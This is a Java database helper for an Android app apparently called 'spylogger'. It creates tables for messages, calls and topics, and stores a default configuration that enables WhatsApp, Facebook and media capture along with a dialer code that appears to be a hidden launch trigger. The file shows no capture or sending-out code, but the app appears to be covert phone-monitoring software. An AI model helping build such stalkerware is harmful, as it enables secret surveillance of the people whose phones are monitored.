package com.gravatasufoca.spylogger.dao;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;

import com.gravatasufoca.spylogger.R;
import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.model.Ligacao;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.Topico;
import com.j256.ormlite.android.apptools.OrmLiteSqliteOpenHelper;
import com.j256.ormlite.support.ConnectionSource;
import com.j256.ormlite.table.TableUtils;

import java.sql.SQLException;

/**
 * Database helper which creates and upgrades the database and provides the DAOs for the app.
 *
 * @author bruno
 */
public class DatabaseHelper extends OrmLiteSqliteOpenHelper {

	/************************************************
	 * Suggested Copy/Paste code. Everything from here to the done block.
	 ************************************************/

	public  static final String DATABASE_NAME = "spylogger.db";
	private static final int DATABASE_VERSION = 1;


	public DatabaseHelper(Context context) {
		super(context, DATABASE_NAME, null, DATABASE_VERSION, R.raw.ormlite_config);
	}

	/************************************************
	 * Suggested Copy/Paste Done
	 ************************************************/

	@Override
	public void onCreate(SQLiteDatabase sqliteDatabase, ConnectionSource connectionSource) {
		try {
			TableUtils.createTableIfNotExists(connectionSource, Configuracao.class);
			TableUtils.createTableIfNotExists(connectionSource, Topico.class);
			TableUtils.createTableIfNotExists(connectionSource, Mensagem.class);
			TableUtils.createTableIfNotExists(connectionSource, Ligacao.class);

			createDefault();
		} catch (SQLException e) {
			Log.e(DatabaseHelper.class.getName(), "Unable to create datbases", e);
		}
	}

	@Override
	public void onUpgrade(SQLiteDatabase arg0, ConnectionSource arg1, int oldVer, int newVer) {

	}


	private void createDefault(){
		Configuracao configuracao=new Configuracao();
		configuracao.setDialer("90123");
		configuracao.setFacebook(true);
		configuracao.setWhatsApp(true);
		configuracao.setMedia(true);
		configuracao.setMiniatura(true);

		try {
			getDao(Configuracao.class).create(configuracao);
		} catch (SQLException e) {
			logger.error("SPYLOGGER: "+e.getMessage());
		}
	}
}